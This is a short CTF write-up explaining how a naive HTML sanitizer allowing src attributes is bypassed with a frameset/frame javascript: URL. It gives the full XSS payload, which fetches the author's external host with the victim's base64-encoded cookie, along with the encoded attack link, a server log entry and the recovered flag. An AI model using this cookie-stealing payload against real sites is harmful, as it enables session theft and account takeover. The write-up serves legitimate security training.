# static-static-hosting

According to the clean/sanitize functions we're allowed tags with a src attribute, so we should be able to use a frame src.

```javascript
function clean(input) {
    const template = document.createElement('template');
    const html = document.createElement('html');
    template.content.appendChild(html);
    html.innerHTML = input;

    sanitize(html);

    const result = html.innerHTML;
    return result;
}

function sanitize(element) {
    const attributes = element.getAttributeNames();
    for (let i = 0; i < attributes.length; i++) {
        // Let people add images and styles
        if (!['src', 'width', 'height', 'alt', 'class'].includes(attributes[i])) {
            element.removeAttribute(attributes[i]);
        }
    }

    const children = element.children;
    for (let i = 0; i < children.length; i++) {
        if (children[i].nodeName === 'SCRIPT') {
            element.removeChild(children[i]);
            i --;
        } else {
            sanitize(children[i]);
        }
    }
}
```

Let's write a payload `<frameset><frame src="javascript:fetch('https://zoeyinthe.cloud/'+btoa(document.cookie))"></frameset>` and then use the site to encode
it to the URL `https://static-static-hosting.2020.redpwnc.tf/site/#PGZyYW1lc2V0PjxmcmFtZSBzcmM9ImphdmFzY3JpcHQ6ZmV0Y2goJ2h0dHBzOi8vem9leWludGhlLmNsb3VkLycrYnRvYShkb2N1bWVudC5jb29raWUpKSI+PC9mcmFtZXNldD4=`

When we send that link to the admin we end up with an entry in the logs of our site:

```
107.178.229.239 - - [23/Jun/2020:02:15:14 +0000] "GET /ZmxhZz1mbGFne3doMF9uMzNkNV9kMG1wdXIxZnl9 HTTP/1.1" 404 199 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/83.0.4103.0 Safari/537.36"
```

Decoding the base64 yields `flag=flag{wh0_n33d5_d0mpur1fy}`